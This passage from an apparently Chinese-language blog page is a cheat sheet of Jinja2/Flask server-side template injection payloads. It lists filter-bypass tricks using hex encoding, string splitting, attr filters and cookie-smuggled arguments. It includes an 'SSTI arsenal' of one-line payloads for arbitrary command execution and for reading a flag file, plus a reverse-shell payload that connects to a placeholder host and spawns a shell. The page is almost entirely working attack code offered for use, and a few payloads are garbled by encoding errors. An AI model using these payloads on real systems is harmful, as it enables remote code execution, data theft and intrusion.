class="hljs-string">&#x27;p&#x27;</span> %&#125;<span class="hljs-number">1</span>&#123;%endif %&#125;<br></code></pre></td></tr></table></figure><h3 id="ç»•è¿‡ç¦ç”¨çš„å…³é”®å‘½ä»¤"><a href="#ç»•è¿‡ç¦ç”¨çš„å…³é”®å‘½ä»¤" class="headerlink" title="ç»•è¿‡ç¦ç”¨çš„å…³é”®å‘½ä»¤"></a><code>ç»•è¿‡ç¦ç”¨çš„å…³é”®å‘½ä»¤</code></h3><p><code>ä¸€äº›ç¦ç”¨äº†lsï¼Œcatï¼Œosç­‰å…³é”®å‘½ä»¤çš„bypassï¼š</code></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;1&#x27;</span>+<span class="hljs-string">&#x27;r&#x27;</span>)<br>- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>].system(<span class="hljs-string">&#x27;l&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)<br>- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__func_globals</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>.<span class="hljs-built_in">values</span>()[<span class="hljs-number">12</span>].system(<span class="hljs-string">&#x27;l&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="åˆ©ç”¨getattribute-å­—ç¬¦ä¸²æ‹¼æ¥"><a href="#åˆ©ç”¨getattribute-å­—ç¬¦ä¸²æ‹¼æ¥" class="headerlink" title="åˆ©ç”¨getattribute()+ å­—ç¬¦ä¸²æ‹¼æ¥"></a><code>åˆ©ç”¨getattribute()+ å­—ç¬¦ä¸²æ‹¼æ¥</code></h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">- <span class="hljs-selector-attr">[]</span>.__class__.__base__.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[72]</span>.__init__.<span class="hljs-built_in">__getattribute__</span>(<span class="hljs-string">&#x27;__global&#x27;</span>+<span class="hljs-string">&#x27;s__&#x27;</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;dir&#x27;</span>)<br>- <span class="hljs-selector-attr">[]</span>.__class__.__base__.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[72]</span>.__init__.<span class="hljs-built_in">__getattribute__</span>(<span class="hljs-string">&#x27;5f5f676c6f62616c735f5f&#x27;</span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;hex&#x27;</span>))<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;dir&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="å…³é”®å­—é”®å­—è¿‡æ»¤-åˆ©ç”¨hexç¼–ç "><a href="#å…³é”®å­—é”®å­—è¿‡æ»¤-åˆ©ç”¨hexç¼–ç " class="headerlink" title="å…³é”®å­—é”®å­—è¿‡æ»¤ - åˆ©ç”¨hexç¼–ç "></a><code>å…³é”®å­—é”®å­—è¿‡æ»¤ - åˆ©ç”¨hexç¼–ç </code></h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">- __builtins__<br>- ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">62</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">74</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;]<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤[]"></a><code>è¿‡æ»¤[]</code></h3><p><code>å¼•å…¥__getitem__è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œæ¯”å¦‚è¯´a[&#39;b&#39;]å°±å¯ä»¥ç”¨a.getitem(&#39;b&#39;)æ¥è¡¨ç¤ºï¼š</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- ?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a.__init__.__globals__.__getitem__</span>(<span class="hljs-name">request.cookies.x</span>).eval(<span class="hljs-name">request.cookies.y</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- cookie:x=__builtins__;y=__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()</span><br></code></pre></td></tr></table></figure><h3 id="å¸¸è§è¿‡æ»¤ï¼ˆâ€™â€™ï¼Œâ€™-mro-and-base"><a href="#å¸¸è§è¿‡æ»¤ï¼ˆâ€™â€™ï¼Œâ€™-mro-and-base" class="headerlink" title="å¸¸è§è¿‡æ»¤ï¼ˆâ€™â€™ï¼Œâ€™, &#39;mro&#39; and &#39;base&#39;)"></a><code>å¸¸è§è¿‡æ»¤ï¼ˆâ€™â€™ï¼Œâ€™, &#39;mro&#39; and &#39;base&#39;)</code></h3><p><code>Flaskæ³¨å…¥éœ€è¦å¤§é‡.ï¼Œ_ï¼Œå¦‚æœè¢«è¿‡æ»¤äº†å¯ä»¥ç”¨[]æ›¿ä»£.ï¼Œ16è¿›åˆ¶ç¼–ç æ›¿ä»£_ï¼š</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">&#x27;application&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\Ã—5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fbuiltins\x5f\Ã—5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\Ã—5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fimport\x5f|x5f&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;id&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[&quot;\x5F\x5Fclass\x5F\x5F&quot;]</span>[&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](<span class="hljs-name">0</span>, <span class="hljs-string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- &#123; &#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()&#125;&#125;//å¯»æ‰¾å¯ç”¨å¼•ç”¨</span><br></code></pre></td></tr></table></figure><h3 id="å¯¼å…¥æ¨¡å—"><a href="#å¯¼å…¥æ¨¡å—" class="headerlink" title="å¯¼å…¥æ¨¡å—"></a><code>å¯¼å…¥æ¨¡å—</code></h3><ul><li><code>__import__(&#39;os&#39;)</code></li><li><code>__import__(&quot;bf&quot;.decode(&#39;rot_13&#39;))</code></li><li><code>__import__(&#39;o&#39;+&#39;s&#39;).system(&quot;whoami&quot;)</code></li><li><code>__import__(&#39;so&#39;[::-1]).system(&#39;whoami&#39;)</code></li><li><code>eval(&#39;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#39;[::-1])</code></li><li><code>exec(&#39;)&quot;imaohw&quot;(metsys.so ;so_tropmi&#39;[::-1])</code></li><li><code>import importlib;importlib.import_module(&quot;os&quot;).system(&quot;whoami&quot;)</code></li><li><code>import sys;sys.modules[&#39;os&#39;]=&#39;not allowed&#39;;del sys.modules[&#39;os&#39;];import os</code></li><li><code>a=open(&#39;/usr/lib/python3.7/os.py&#39;).read();exec(a);system(&quot;whoami&quot;)</code></li><li><code>execfile(&#39;/usr/lib/python2.7/os.py&#39;);system (&quot;whoami&quot;) # ONLY Python2</code></li></ul><h3 id="ä¸‹åˆ’çº¿"><a href="#ä¸‹åˆ’çº¿" class="headerlink" title="ä¸‹åˆ’çº¿"></a><code>ä¸‹åˆ’çº¿</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>((),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;class&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;bases&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;getitem&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>)(<span class="hljs-number">0</span>),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;subclasses&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>)(),<span class="hljs-string">&#x27;pop&#x27;</span>)(<span class="hljs-number">37</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">*?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).<span class="hljs-built_in">eval</span>(request.cookies.x5)&#125;&#125;<br></code></pre></td></tr></table></figure><p><code>Cookieä¼ å‚ï¼š</code></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">x1=<span class="hljs-variable">__init__</span>;x2=<span class="hljs-variable">__globals__</span>;x3=<span class="hljs-variable">__getitem__</span>;x4=<span class="hljs-variable">__builtins__</span>;x5=<span class="hljs-variable">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨ç»•è¿‡å†å€ŸåŠ©print-å›æ˜¾"><a href="#ä½¿ç”¨ç»•è¿‡å†å€ŸåŠ©print-å›æ˜¾" class="headerlink" title="ä½¿ç”¨ç»•è¿‡å†å€ŸåŠ©print()å›æ˜¾&#96;"></a><code>ä½¿ç”¨</code>ç»•è¿‡å†å€ŸåŠ©print()å›æ˜¾&#96;</h3><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">- ?name=</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">print</span>((abc<span class="hljs-punctuation">|</span>attr(request.cookies.a)<span class="hljs-punctuation">|</span>attr(request.cookies.b)<span class="hljs-punctuation">|</span>attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e))<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">- Cookie:a=__init__;b=__globals__;c=__getitem__;d=__builtins__;e=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br><span class="language-xml">- ?name=</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>((x<span class="hljs-punctuation">|</span>attr(request.cookies.x<span class="hljs-number">1</span>)<span class="hljs-punctuation">|</span>attr(request.cookies.x<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span>attr(request.cookies.x<span class="hljs-number">3</span>))(request.cookies.x<span class="hljs-number">4</span>).eval(request.cookies.x<span class="hljs-number">5</span>))<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(lipsum<span class="hljs-punctuation">|</span>attr(%<span class="hljs-number">27</span>\u<span class="hljs-number">005</span>f\x<span class="hljs-number">5</span>f\u<span class="hljs-number">0067</span>\x<span class="hljs-number">6</span>c\u<span class="hljs-number">006</span>f\x<span class="hljs-number">62</span>\x<span class="hljs-number">61</span>\x<span class="hljs-number">6</span>c\x<span class="hljs-number">73</span>\x<span class="hljs-number">5</span>f\x<span class="hljs-number">5</span>f%<span class="hljs-number">27</span>))<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤äº†æ•°å­—"><a href="#è¿‡æ»¤äº†æ•°å­—" class="headerlink" title="è¿‡æ»¤äº†æ•°å­—"></a><code>è¿‡æ»¤äº†æ•°å­—</code></h3><ul><li><code>æ„é€ å‡º1: &#123;&#123;(dict(e=a)|join|count)&#125;&#125;</code></li></ul><h3 id="å…³é”®å­—ç»•è¿‡"><a href="#å…³é”®å­—ç»•è¿‡" class="headerlink" title="å…³é”®å­—ç»•è¿‡"></a><code>å…³é”®å­—ç»•è¿‡</code></h3><ul><li><code>class, base</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;dict(__cl=a,ass__=a)|<span class="hljs-name">join</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><code>è¿˜å¯ä»¥ä½¿ç”¨å…¨è§’çš„æ•°å­—ç»•è¿‡ï¼š</code></li><li><code>ï¼ï¼‘ï¼’ï¼“ï¼”ï¼•ï¼–ï¼—ï¼˜ï¼™</code></li></ul><h3 id="SSTIæ­¦å™¨åº“"><a href="#SSTIæ­¦å™¨åº“" class="headerlink" title="SSTIæ­¦å™¨åº“"></a><code>SSTIæ­¦å™¨åº“</code></h3><ol><li><code>ä»»æ„å‘½ä»¤æ‰§è¡Œ:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">for</span></span> i <span class="hljs-keyword">in</span> &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">if</span></span> i.__name__ ==&#x27;_wrap_close&#x27;%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span> i.__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">endif</span></span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">endfor</span></span>%&#125;</span><br></code></pre></td></tr></table></figure></li><li><code>ä»»æ„å‘½ä»¤æ‰§è¡Œ:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ol><ul><li><code>è¿™ä¸ª138å¯¹åº”çš„ç±»æ˜¯os._wrap_closeï¼Œåªéœ€è¦æ‰¾åˆ°è¿™ä¸ªç±»çš„ç´¢å¼•å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªpayload</code></li></ul><ol start="3"><li><code>ä»»æ„å‘½ä»¤æ‰§è¡Œ:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li><li><code>ä»»æ„å‘½ä»¤æ‰§è¡Œ:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ol><ul><li><code>xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx</code></li></ul><ol start="5"><li><code>ä»»æ„å‘½ä»¤æ‰§è¡Œ:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;config.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li><li><code>æ–‡ä»¶è¯»å–:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;, &#x27;r&#x27;).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ol><ul><li><code>xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx</code></li></ul><h1 id="å‘½ä»¤æ‰§è¡Œ-eval"><a href="#å‘½ä»¤æ‰§è¡Œ-eval" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ_eval"></a><code>å‘½ä»¤æ‰§è¡Œ_eval</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;eval&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;].__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="å‘½ä»¤æ‰§è¡Œ-os-py"><a href="#å‘½ä»¤æ‰§è¡Œ-os-py" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ_os.py"></a><code>å‘½ä»¤æ‰§è¡Œ_os.py</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;os&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="å‘½ä»¤æ‰§è¡Œ-popen"><a href="#å‘½ä»¤æ‰§è¡Œ-popen" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ_popen"></a><code>å‘½ä»¤æ‰§è¡Œ_popen</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;popen&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="å‘½ä»¤æ‰§è¡Œ-frozen-importlib-BuiltinImporter"><a href="#å‘½ä»¤æ‰§è¡Œ-frozen-importlib-BuiltinImporter" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ__frozen_importlib.BuiltinImporter"></a><code>å‘½ä»¤æ‰§è¡Œ__frozen_importlib.BuiltinImporter</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;BuiltinImporter&#x27; <span class="hljs-keyword">in</span> x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x[&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls /&quot;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="å‘½ä»¤æ‰§è¡Œ-linecache"><a href="#å‘½ä»¤æ‰§è¡Œ-linecache" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ_linecache"></a><code>å‘½ä»¤æ‰§è¡Œ_linecache</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;linecache&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="å‘½ä»¤æ‰§è¡Œ-exec-æ— å›æ˜¾æ•…åå¼¹shell"><a href="#å‘½ä»¤æ‰§è¡Œ-exec-æ— å›æ˜¾æ•…åå¼¹shell" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ_exec(æ— å›æ˜¾æ•…åå¼¹shell)"></a><code>å‘½ä»¤æ‰§è¡Œ_exec(æ— å›æ˜¾æ•…åå¼¹shell)</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;exec&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;].__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;HOST_IP&quot;,Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;().__class__.__bases__[0].__subclasses__()[216].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;VPS_IP&quot;,ç«¯å£));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="å‘½ä»¤æ‰§è¡Œ-catch-warnings"><a href="#å‘½ä»¤æ‰§è¡Œ-catch-warnings" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ_catch_warnings"></a><code>å‘½ä»¤æ‰§è¡Œ_catch_warnings</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;war&#x27; <span class="hljs-keyword">in</span> x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; 